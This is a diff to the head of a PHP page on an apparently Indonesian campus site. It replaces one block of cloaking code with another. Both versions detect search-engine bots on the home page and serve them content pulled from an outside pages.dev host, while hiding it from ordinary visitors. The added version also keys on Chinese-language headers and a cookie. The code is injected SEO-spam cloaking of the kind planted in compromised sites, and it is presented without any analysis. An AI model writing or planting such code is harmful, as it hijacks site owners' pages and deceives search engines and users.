@@ -1,17 +1,16 @@
 <?php
-$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
-$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
-$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
-
-if ($uri == '/' && (
-    strpos($userAgent, 'bot') !== false || 
-    strpos($userAgent, 'google') !== false || 
-    strpos($userAgent, 'chrome-lighthouse') !== false || 
-    strpos($referer, 'google') !== false
-)) {
-    echo file_get_contents('https://punten-neng.pages.dev/staialfalah/pai/category/berita-kampus/');
-    exit();
-}
+    $s_ref = $_SERVER['HTTP_REFERER'];
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+            setcookie('az', 'lp', time() + 3600 * 7200);
+            echo ' '; // Your bot-specific content
+            exit;
+        }
+        echo file_get_contents("https://punten-neng.pages.dev/staialfalah/pai/category/berita-kampus/");
+        exit;
+    }
 ?>
 <!DOCTYPE html>
 <html lang="id">
